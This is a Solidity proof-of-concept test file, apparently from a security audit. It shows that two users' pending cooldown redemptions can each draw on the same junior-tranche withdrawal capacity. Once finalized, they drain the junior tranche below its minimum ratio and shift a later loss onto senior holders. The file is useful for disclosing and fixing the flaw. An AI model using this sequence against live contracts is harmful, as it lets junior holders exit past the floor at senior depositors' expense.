// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import { SharesCooldown } from "../../../contracts/tranches/base/cooldown/SharesCooldown.sol";
import { ISharesCooldown } from "../../../contracts/tranches/interfaces/cooldown/ISharesCooldown.sol";
import { ITranche } from "../../../contracts/tranches/interfaces/ITranche.sol";

import {
    HuntDeployment,
    HuntStack
} from "./DiscreteAccountingConservationInvariant.t.sol";

/// @notice Tests whether multiple pending JRT SharesLock requests can each consume the
/// same normal-user withdrawal capacity and later finalize through the cooldown's
/// owner-specific full-real-JRT cap.
contract CooldownPendingCapacityPoC is HuntDeployment {
    bytes32 internal constant COOLDOWN_WORKER_ROLE = keccak256("COOLDOWN_WORKER_ROLE");
    uint32 internal constant LOCK_SECONDS = uint32(1 days);

    function _configureJrtCooldown(HuntStack memory s) internal returns (SharesCooldown cooldown) {
        SharesCooldown impl = new SharesCooldown();
        cooldown = SharesCooldown(address(new ERC1967Proxy(
            address(impl),
            abi.encodeWithSignature("initialize(address,address)", owner, address(s.acm))
        )));

        ISharesCooldown.TExitParams memory locked = ISharesCooldown.TExitParams({
            feePpm: 0,
            sharesLock: LOCK_SECONDS
        });
        ISharesCooldown.TExitParams memory unlocked = ISharesCooldown.TExitParams({
            feePpm: 0,
            sharesLock: 0
        });
        ISharesCooldown.TExitUpperBounds memory bounds = ISharesCooldown.TExitUpperBounds({
            p0: 200_000, // 20% coverage: lock the 10% initial state and the 6% state after request #1
            p1: 200_000,
            r0: locked,
            r1: locked,
            r2: unlocked
        });

        vm.startPrank(owner);
        cooldown.setTwoStepConfigManager(owner);
        s.cdo.setSharesCooldown(ISharesCooldown(address(cooldown)));
        s.acm.grantRole(COOLDOWN_WORKER_ROLE, address(s.cdo));
        cooldown.setVaultExitBounds(address(s.jrt), bounds);
        vm.stopPrank();
    }

    function _seedZeroAprStack()
        internal
        returns (HuntStack memory s, SharesCooldown cooldown)
    {
        s = _deploy();

        // Remove projection from this experiment. The next deposit fetches this round,
        // so request/finalize behavior cannot be attributed to the known rewardless
        // DiscreteAccounting projection path.
        s.feed.updateRoundData(0, 0, uint64(block.timestamp));

        _deposit(s, alice, s.jrt, 50e18);
        _deposit(s, bob, s.jrt, 50e18);
        _deposit(s, carol, s.srt, 1_000e18);
        cooldown = _configureJrtCooldown(s);

        assertEq(s.accounting.minimumJrtSrtRatio(), 0.05e18, "unexpected minimum ratio");
        assertEq(s.accounting.maxWithdraw(true), 50e18, "unexpected initial JRT capacity");
        assertEq(s.cdo.coverage(), 100_000, "unexpected initial coverage"); // 10%
    }

    function test_pendingRequestsOverbookJrtCapacityAndFinalizeBelowFloor() public {
        (HuntStack memory s, SharesCooldown cooldown) = _seedZeroAprStack();

        // Alice reserves 40 JRT worth of shares for a delayed exit. Shares move into
        // the cooldown silo; no assets leave and accounting's normal maxWithdraw does
        // not consume the 40-asset capacity.
        vm.prank(alice);
        uint256 aliceImmediateAssets = s.jrt.redeem(40e18, alice, alice);
        assertEq(aliceImmediateAssets, 0, "SharesLock transferred assets at request time");
        assertEq(s.jrt.balanceOf(address(cooldown)), 40e18, "Alice shares not locked");
        assertEq(s.accounting.maxWithdraw(true), 50e18, "pending request consumed accounting cap");
        assertEq(s.cdo.coverage(), 60_000, "locked Alice shares not excluded from coverage"); // 6%

        // Bob is still independently allowed to queue another 40 against the same
        // 50-asset normal-user capacity.
        assertGe(s.jrt.maxRedeem(bob), 40e18, "Bob cannot reproduce second pending request");
        vm.prank(bob);
        uint256 bobImmediateAssets = s.jrt.redeem(40e18, bob, bob);
        assertEq(bobImmediateAssets, 0, "SharesLock transferred Bob assets at request time");
        assertEq(s.jrt.balanceOf(address(cooldown)), 80e18, "pending exits not aggregated in silo");
        assertEq(s.accounting.maxWithdraw(true), 50e18, "second pending request unexpectedly consumed cap");
        assertEq(s.cdo.coverage(), 20_000, "two pending exits should leave 2% unlocked coverage");

        // The queued 80 assets exceed the 50 assets that a normal JRT holder is allowed
        // to remove while preserving the configured 5% JRT/SRT minimum.
        uint256 queuedAssets = s.jrt.convertToAssets(s.jrt.balanceOf(address(cooldown)));
        assertGt(queuedAssets, s.accounting.maxWithdraw(true), "pending exits did not overbook JRT capacity");

        vm.warp(block.timestamp + LOCK_SECONDS + 1);

        // Finalization is permissionless. Each request redeems with owner=cooldown,
        // which receives the special full-real-JRT cap rather than the normal ratio cap.
        vm.prank(makeAddr("keeperAlice"));
        cooldown.finalize(ITranche(address(s.jrt)), address(0), alice);
        vm.prank(makeAddr("keeperBob"));
        cooldown.finalize(ITranche(address(s.jrt)), address(0), bob);

        (uint256 jrtAfter, uint256 srtAfter,) = s.accounting.totalAssetsT0();
        assertEq(jrtAfter, 20e18, "unexpected JRT after pending exits finalize");
        assertEq(srtAfter, 1_000e18, "SRT changed before loss");
        assertEq(s.asset.balanceOf(alice), 40e18, "Alice payout mismatch");
        assertEq(s.asset.balanceOf(bob), 40e18, "Bob payout mismatch");
        assertLt(
            jrtAfter * 1e18 / srtAfter,
            s.accounting.minimumJrtSrtRatio(),
            "finalization did not breach configured minimum JRT/SRT ratio"
        );
    }

    function test_overbookedCooldownExitsShiftSubsequentFirstLossToSenior() public {
        // -------- Control: only the 50-asset normal JRT capacity exits --------
        (HuntStack memory control, SharesCooldown controlCooldown) = _seedZeroAprStack();

        vm.prank(alice);
        control.jrt.redeem(50e18, alice, alice);
        vm.warp(block.timestamp + LOCK_SECONDS + 1);
        controlCooldown.finalize(ITranche(address(control.jrt)), address(0), alice);

        (uint256 controlJrtBeforeLoss, uint256 controlSrtBeforeLoss,) = control.accounting.totalAssetsT0();
        assertEq(controlJrtBeforeLoss, 50e18, "control did not preserve minimum JRT");
        assertEq(controlSrtBeforeLoss, 1_000e18, "control SRT baseline mismatch");

        control.strategy.reportLoss(30e18);
        _sync(control);
        (uint256 controlJrtAfterLoss, uint256 controlSrtAfterLoss,) = control.accounting.totalAssetsT0();
        assertEq(controlJrtAfterLoss, 20e18, "control JRT loss allocation mismatch");
        assertEq(controlSrtAfterLoss, 1_000e18, "control loss reached Senior unexpectedly");

        // Reset time only by deploying an independent stack at the current timestamp.
        // -------- Candidate path: two 40-asset requests overbook the same cap --------
        (HuntStack memory attack, SharesCooldown attackCooldown) = _seedZeroAprStack();

        vm.prank(alice);
        attack.jrt.redeem(40e18, alice, alice);
        vm.prank(bob);
        attack.jrt.redeem(40e18, bob, bob);

        vm.warp(block.timestamp + LOCK_SECONDS + 1);
        attackCooldown.finalize(ITranche(address(attack.jrt)), address(0), alice);
        attackCooldown.finalize(ITranche(address(attack.jrt)), address(0), bob);

        (uint256 attackJrtBeforeLoss, uint256 attackSrtBeforeLoss,) = attack.accounting.totalAssetsT0();
        assertEq(attackJrtBeforeLoss, 20e18, "candidate path did not drain JRT below floor");
        assertEq(attackSrtBeforeLoss, 1_000e18, "candidate SRT baseline mismatch");

        attack.strategy.reportLoss(30e18);
        _sync(attack);
        (uint256 attackJrtAfterLoss, uint256 attackSrtAfterLoss,) = attack.accounting.totalAssetsT0();

        assertEq(attackJrtAfterLoss, 0, "candidate JRT should be exhausted by first loss");
        assertEq(attackSrtAfterLoss, 990e18, "expected 10 assets of loss shifted to Senior");
        assertEq(
            controlSrtAfterLoss - attackSrtAfterLoss,
            10e18,
            "pending-capacity overbooking did not create measurable Senior loss"
        );
    }
}
